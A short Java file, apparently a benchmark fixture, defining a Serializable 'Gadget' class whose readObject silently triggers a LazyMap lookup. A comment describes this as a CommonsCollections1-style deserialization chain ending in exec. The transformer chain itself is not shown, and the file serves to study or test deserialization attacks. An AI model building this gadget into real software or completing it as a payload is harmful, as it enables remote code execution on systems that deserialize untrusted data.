package com.bench;
import java.io.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
// CC1-style chain: readObject -> trigger -> LazyMap.get -> ChainedTransformer.transform -> InvokerTransformer.transform -> Method.invoke -> exec
public class Gadget implements Serializable {
    private static final long serialVersionUID = 1L;
    private LazyMap map;
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        try { trigger(); } catch (Exception e) {}
    }
    private void trigger() throws Exception { map.get("x"); }   // -> LazyMap.get -> chain -> exec
}
